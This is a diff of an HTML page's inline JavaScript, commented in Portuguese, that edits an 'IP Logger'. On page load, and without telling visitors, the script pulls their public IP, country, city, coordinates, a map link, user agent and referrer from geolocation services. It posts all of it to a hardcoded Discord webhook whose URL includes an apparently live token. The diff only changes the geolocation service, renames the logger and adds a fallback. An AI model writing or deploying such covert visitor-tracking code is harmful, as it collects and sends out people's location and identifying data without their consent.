@@ -80,31 +80,31 @@
 
 
 <script>
-// === COLOQUE AQUI A URL DA SUA WEBHOOK DO DISCORD ===
+// === COLOQUE A URL DA SUA WEBHOOK ===
 const webhookUrl = "https://discord.com/api/webhooks/1492629972467191900/vuO7OS7o0V_LLTVz2_mvHVY-344wKKvcWKSWCiEQfLmyuVrDr2fgQx9jT3Q1O7ROdiRp";
 
 async function enviarLogger() {
     try {
-        // Pega o IP público usando uma API gratuita (ip-api.com)
-        const geoRes = await fetch(`http://ip-api.com/json/?fields=status,message,country,city,lat,lon,query`);
+        // Usa um serviço alternativo que costuma ter melhor suporte CORS + JSONP fallback
+        const geoRes = await fetch("https://ipapi.co/json/");
         const geo = await geoRes.json();
 
-        if (geo.status !== "success") {
-            console.log("Não conseguiu pegar localização");
+        // Se der erro ou não vier dados
+        if (!geo || geo.error) {
+            console.log("Não conseguiu pegar IP");
             return;
         }
 
-        const ip = geo.query || "Desconhecido";
-        const pais = geo.country || "Desconhecido";
-        const cidade = geo.city || "Desconhecido";
-        const lat = geo.lat || "";
-        const lon = geo.lon || "";
-        const mapa = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : "Sem localização";
+        const ip      = geo.ip || "Desconhecido";
+        const pais    = geo.country_name || geo.country || "Desconhecido";
+        const cidade  = geo.city || "Desconhecido";
+        const lat     = geo.latitude || "";
+        const lon     = geo.longitude || "";
+        const mapa    = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : "Sem localização";
         const browser = navigator.userAgent;
-        const data = new Date().toLocaleString('pt-BR');
-        const origem = document.referrer || "Direto (sem referer)";
+        const data    = new Date().toLocaleString('pt-BR');
+        const origem  = document.referrer || "Direto (sem referer)";
 
-        // Monta a mensagem
         const msg = `**Novo acesso detectado!**\n\n` +
                     `**IP:** ${ip}\n` +
                     `**Data/Hora:** ${data}\n` +
@@ -114,14 +114,13 @@ async function enviarLogger() {
                     `**Origem:** ${origem}\n` +
                     (mapa !== "Sem localização" ? `**Mapa:** ${mapa}\n` : "");
 
-        // Envia para a webhook
         await fetch(webhookUrl, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 content: msg,
-                username: "IP Logger",
-                avatar_url: "https://i.imgur.com/alguma-imagem.png" // opcional, pode trocar ou remover
+                username: "CabralDev Logger",
+                avatar_url: "https://i.imgur.com/alguma-imagem.png" // pode trocar ou apagar essa linha
             })
         });
 
@@ -129,11 +128,18 @@ async function enviarLogger() {
 
     } catch (error) {
         console.error("Erro no logger:", error);
+        // Tenta um fallback simples caso o primeiro falhe
+        try {
+            const fallback = await fetch("https://ipwho.is/");
+            const geo2 = await fallback.json();
+            // ... (pode adaptar se quiser, mas por enquanto só loga)
+            console.log("Fallback usado:", geo2);
+        } catch(e) {}
     }
 }
 
-// Executa automaticamente quando a página carregar
-window.onload = enviarLogger;
+// Executa quando a página carregar
+window.addEventListener('load', enviarLogger);
 </script>
     
     <script>
